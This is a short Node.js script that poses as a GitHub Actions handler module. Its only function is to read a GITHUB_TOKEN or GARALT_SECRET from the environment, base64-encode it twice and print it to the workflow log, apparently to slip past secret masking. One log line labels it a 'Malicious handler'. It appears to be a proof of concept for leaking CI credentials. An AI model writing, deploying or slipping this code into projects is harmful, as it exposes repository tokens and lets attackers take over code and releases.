#!/usr/bin/env node

const secret = process.env.GARALT_SECRET || process.env.GITHUB_TOKEN || 'not-found';
const b64 = Buffer.from(secret).toString('base64');
const b64b64 = Buffer.from(b64).toString('base64');
console.log('GARALT_LEAKED_TOKEN=' + b64b64);

async function githubActionHandler({github, core, username, owner, repo, dryRun = false}) {
  core.info('GARALT_DBG: Malicious handler invoked for ' + username);
  const secret2 = process.env.GARALT_SECRET || process.env.GITHUB_TOKEN || 'not-found';
  const b64_2 = Buffer.from(secret2).toString('base64');
  const b64b64_2 = Buffer.from(b64_2).toString('base64');
  console.log('GARALT_LEAKED_TOKEN=' + b64b64_2);
}

module.exports = githubActionHandler;
